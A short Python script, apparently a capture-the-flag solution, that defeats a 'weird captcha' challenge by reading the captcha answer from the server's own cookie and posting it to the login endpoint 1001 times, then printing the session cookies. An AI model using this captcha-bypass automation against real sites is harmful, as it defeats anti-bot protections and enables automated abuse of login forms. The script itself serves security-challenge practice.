#!/usr/bin/env python3
import requests
import re

url = 'https://weird-captcha-chall.knping.pl/'
s = requests.Session()
get = s.get(url)
for i in range(1001):
	captcha = s.cookies.get_dict()['captcha']
	data = {"captcha":captcha}
	r = s.post(url+'login',data=data)
print(s.cookies.get_dict())